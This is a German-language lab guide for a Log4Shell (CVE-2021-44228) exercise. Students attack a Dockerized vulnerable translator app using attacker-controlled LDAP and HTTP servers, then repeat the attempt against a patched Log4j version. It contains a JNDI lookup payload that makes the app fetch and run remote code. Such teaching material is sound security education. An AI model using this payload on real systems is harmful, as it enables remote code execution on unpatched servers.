# Log4Shell Übungsanleitung

## Allgemeines / Angriff

### Log4J

Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft, Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und speichert Fehlerberichte oder Zwischenergebnisse, die als "Logs" bezeichnet werden. Diese Logs können später eingesehen werden, um besser zu verstehen, wie die Software in bestimmten Situationen reagiert hat. Log4j läuft auf der freien Open Source Software der Apache Software Foundation und gilt als Vorreiter für Login-Frameworks und wird in den meisten Java basierten Programmen als Standard verwendet. 


### Log4Shell

Die Schwachstelle in Log4j wird als Log4Shell oder CVE-2021-44228 bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer Injektionsschwachstelle in dem Java-Logging-Framework Log4j. Ein Angreifer könnte diese Schwachstelle nutzen und damit einzelne Programme ausführen oder gar das System vollständig übernehmen. Dadurch könnte zum Beispiel weitere Schadsoftware nachgeladen oder vertrauliche Daten aus dem System geschöpft werden. 

### Hilfreiche Unix Befehle

- **bash [Option] [Befehl]**: Führt ein Befehl in der Bash Konsole aus
    - bash -c "<-Befehl>"
    - bash ./<ausführbare_datei>
- **ls [Option]**: Steht für "list", zeigt den Inhalt eines Verzeichnisses an
    - ls -l —> zeigt weitere Informationen zum Inhalt an (z.B. Dateirechte)
    - ls -la —> zeigt auch versteckte Dateien (z.B. Dateien die mit einem "." beginnen)
    - ls -R —> zeigt rekursiv auch den Inhalt von Unterordnern an
- **cd [Verzeichnis(-Pfad)]**: Steht für "change directory", z.dt. "Verzeichnis wechseln"
    - cd .. —> wechselt bspw. in das übergeordnete Verzeichnis
- **rm** **[Option]** **[Datei/Verzeichnis]**: Löscht eine Datei oder ein Verzeichnis
    - rm [Datei] —> löscht eine Datei
    - rm -rf [Verzeichnis] —> löscht Verzeichnis rekursiv und ohne Nachfrage
- **cat [Datei(-Pfad)]**: Kann dazu genutzt werden um den Inhalt einer Datei auszugeben
- **./<Datei>**: Führt die Datei aus

## Log4Shell Versuch - Teil 1

### Komponenten

- **translatorapp**

Die Anwendung TranslatorApp dient Übersetzungprogramm. Der Nutzer kann die Anwendung nutzen, um deutsche Begriffe einzugeben, die dann ins Englische übersetzt und ausgegeben werden.
Bei Wörtern deren Übersetzung in der Anwendung noch nicht existieren, erscheint eine Information, dass daran gearbeitet wird. 
Die Anwendung ist eine Java-Anwendung und verwendet zum Loggen der Benutzereingaben das Java-Framework Log4J. Die Anwendung logt die Benutzereingaben, um Rückschlüsse zu ziehen, welche Eingaben erfolgreich übersetzt werden konnten und wo noch Verbesserungspotential für die Anwendung herrscht. Die für die Sicherheitslücke Log4Shell benötigte Log4J-Version (2.14.1) wird hier verwendet.

- **httpserver**

Der HTTP-server nimmt Anfragen von der Wanwendung entgegen und wird vom Angreifer kontrolliert. Er liefert beispielsweise Schadcode zurück und sorgt dafür, dass der Angreifer diesen Code beim Opfer einschleust. HTTP-Server hostet .class-Dateien, die für eine Remote-Code-Ausführung verwendet werden.

- **ldapserver**

Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip wie ein Telefonbuch: er kann Einträge von Benutzern oder Konfigurationen, aber auch IP-Adressen von beispielsweise Datenbanken enthalten. Der LDAP-Referral-Server leitet bestimmte LDAP-Abfragen an den HTTP-Server weiter.

### Aufbau der Übung 

#### Einführung

In diesem Versuch werden sie die verwundbare Anwendung 'TranslatorApp' durch eine Injektionsschwachstelle angreifen und können so Schadcode auf der Anwendung ausführen lassen.

##### 1. Docker-compose

Der Versuch beginnt damit, dass die benötigten Docker-Container erstellt und gestartet werden.
Der folgende Befehl führt die docker-compose.yml Datei aus und lässt mit (-d: detached) die Container im Hintergrund laufen:

```bash 
$ docker-compose up -d
```

Mit dem folgenden Befehl kannst du überprüfen ob deine Container alle laufen und wie deren Container-Namen lauten:

```bash 
$ docker-compose ps
```

Hinweis: Falls du hier nicht weiterkommst, solltest du überprüfen, ob du dich im richtigen Ordner befindest.

##### 2. Anwendung im interaktiven Modus starten

Da nun die Container alle im Hintergrund laufen und wir eine Shell für unsere Anwendung 'TranslatorApp' benötigen, muss die Shell für die TranslatorApp mit folgendem Befehl gestartet werden:

```bash
$ docker exec -it <container_name> java -cp /root/dependencies/*:/root <Dateiname>
```

##### 3. Anwendung ausprobieren

Jetzt kann die Anwendung ganz normal ausprobiert werden. Du kannst die Wörter (Hallo, Welt, Hund, Apfel, Stuhl) eingeben und bekommst die Übersetzung ins englische ausgegeben.

##### 4. Log des HTTPServers öffnen

Bevor es zum eigentlichen Angriff kommt, solltest du die Log deines HTTP-Server-Containers starten. Hier wirst du sehen, dass der HTTP-Server auf port 8080 läuft. Sobald du nun im 5. Schritt den Exploit durchführst, kannst du hier sehen, dass der HTTP-Server eine HTTP-Request der Opfer-Anwendung 'TranslatorApp' erhält.

```bash
$ docker logs -f <container_name>
```

##### 5. Exploit

Um den Log4Shell-Angriff durchführen zu können, musst du in das Eingabefeld einen präparierten JNDI-Befehl eingeben.

```bash
${jndi:ldap://<HOSTNAME_LDAP>:<PORTNUMMER_LDAP>/cn=BadCode,dc=src}
```

Falls du den präparierten JNDI-Befehl richtig eingegeben hast, sollte jetzt der Schadcode auf der Anwendung ausgeführt und du solltest eine Ausgabe in Dauerschleife sehen.
Mit der Tastenkombination 'STRG' + 'C' kannst du die Container-Shell beenden.
Der HTTP-Server sollte nun die Nachricht ausgeben, dass eine Request der Opferanwendung angekommen ist und eine Response an die Opferanwendung rausgeschickt wurde. 

Hinweis: Den Hostnamen und den Port des LDAP-Servers findest du innerhalb einer Datei in den Verzeichnissen des Versuchs. 

##### 6. Log-File der Anwendung auslesen

Die Anwendung erstellt eine log-file, in der die Logs gespeichert werden. Diese log-file kannst du auslesen in dem du dich langsam mit dem Befehl 'ls' in die Verzeichnisse rantastest.

```bash
docker exec -it <container_name> ls /root
```

Du solltest nun den Ordner 'logs' angezeigt bekommen. Passe deinen Befehl oben so an, dass du nun den Inhalt des Ordners 'logs' angezeigt bekommst.
Nun kannst du mit dem Befehl 'cat' die log-file auslesen. In der log-file sollte der JNDI-Lookup nur als String mitgeloggt werden. 


**Sie haben nun das Ende der Log4Shell-Übung Teil 1/2 erreicht.**






## Log4Shell Versuch - Teil 2

### Komponenten

Die Komponenten sind die gleichen wie im ersten Teil der Übung. Die einzige Änderung ist in der Komponente 'translatorapp'. Dort wird jetzt im zweiten Teil der Übung die Log4J-Version (2.20.0) verwendet.
Diese Log4J-Version ist die gepatchte Version und ermöglicht keine JNDI-Lookups mehr. Somit schließt es die Sicherheitslücke im Log4J-Framework. 

### Aufbau der Übung 

#### Einführung

In diesem Versuch werden sie versuchen, die Anwendung 'TranslatorApp' durch eine Injektionsschwachstelle anzugreifen und Schadcode auf der Anwendung ausführen zu lassen.
Beachte, dass du jetzt in das richtige Verzeichnis wechselst. Du solltest dich im Ordner "Log4Shellgepatcht" befinden.

##### 1. Docker-compose

Der Versuch beginnt damit, dass die benötigten Docker-Container erstellt und gestartet werden.
Der folgende Befehl führt die docker-compose.yml Datei aus und lässt mit (-d: detached) die Container im Hintergrund laufen:

```bash 
$ docker-compose up -d
```

Mit dem folgenden Befehl kannst du überprüfen ob deine Container alle laufen und wie deren Container-Namen lauten:

```bash 
$ docker-compose ps
```

Hinweis: Falls du hier nicht weiterkommst, solltest du überprüfen, ob du dich im richtigen Ordner befindest.

##### 2. Anwendung im interaktiven Modus starten

Da nun die Container alle im Hintergrund laufen und wir eine Shell für unsere Anwendung 'TranslatorApp' benötigen, muss die Shell für die TranslatorApp mit folgendem Befehl gestartet werden:

```bash
$ docker exec -it <container_name> java -cp /root/dependencies/*:/root <Dateiname>
```

##### 3. Log des HTTPServers öffnen

Bevor es zum Versuch des Angriff kommt, solltest du die Log deines HTTP-Server-Containers starten. Hier wirst du sehen, dass der HTTP-Server auf port 8080 läuft. Sobald du nun im 4. Schritt versuchst den Exploit durchzuführen, kannst du hier sehen dass der HTTP-Server läuft, aber nie eine HTTP-Request von der Opferanwendung erhalten wird.

```bash
$ docker logs -f <container_name>
```

##### 4. Exploit

Um die Anwendung auf eine Sicherheitslücke zu untersuchen, gibst du nun den selben präparierten JNDI-Befehl wie im ersten Teil der Übung ein.

```bash
${jndi:ldap://<HOSTNAME_LDAP>:<PORTNUMMER_LDAP>/cn=BadCode,dc=src}
```

Falls du den präparierten JNDI-Befehl richtig eingegeben hast, sollte jetzt der Schadcode NICHT auf der Anwendung ausgeführt werden.

Hinweis: Den Hostnamen und den Port des LDAP-Servers findest du innerhalb einer Datei in den Verzeichnissen des Versuchs. 

##### 6. Log-File der Anwendung auslesen

Die Anwendung erstellt eine log-file, in der die Logs gespeichert werden. Diese log-file kannst du auslesen in dem du dich langsam mit dem Befehl 'ls' in die Verzeichnisse rantastest.

```bash
docker exec -it <container_name> ls /root
```

Du solltest nun den Ordner 'logs' angezeigt bekommen. Passe deinen Befehl oben so an, dass du nun den Inhalt des Ordners 'logs' angezeigt bekommst.
Nun kannst du mit dem Befehl 'cat' die log-file auslesen. In der log-file sollte der JNDI-Lookup nur als String mitgeloggt werden. 

**Sie haben nun das Ende der Log4Shell-Übung Teil 2/2 erreicht.**